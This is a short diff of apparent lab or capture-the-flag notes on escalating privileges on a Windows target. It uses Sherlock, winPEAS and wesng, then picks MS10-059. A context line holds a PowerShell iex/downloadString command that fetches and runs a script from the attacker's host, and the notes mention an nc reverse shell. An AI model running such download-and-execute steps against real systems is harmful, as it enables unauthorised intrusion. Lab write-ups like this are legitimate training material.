@@ -305,7 +305,9 @@ Global Group memberships     *None
 User babis does not require any password, that might be something interesting.
 
 As patches are missing, use Sherlock script to find vulnerabilities:
+
 https://github.com/rasta-mouse/Sherlock
+
 https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/
 
 Download github and spawn a http server which can be called from the victim machine
@@ -323,6 +325,7 @@ c:\Windows\Temp>powershell "iex(new-object net.webclient).downloadString('10.10.
 Powershell seems to get stuck, reverse shell over nc cannot handle it. One option is to go to meterpreter, but for now we use 
 
 -winpeas.bat: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat
+
 -wesng (https://github.com/bitsadmin/wesng) is a Windows Exploit Suggester Next Generation, and it find 236 vulnerabilities.
 
 So much to choose from, let's go with CVE-2010-2554 (MS10-059).
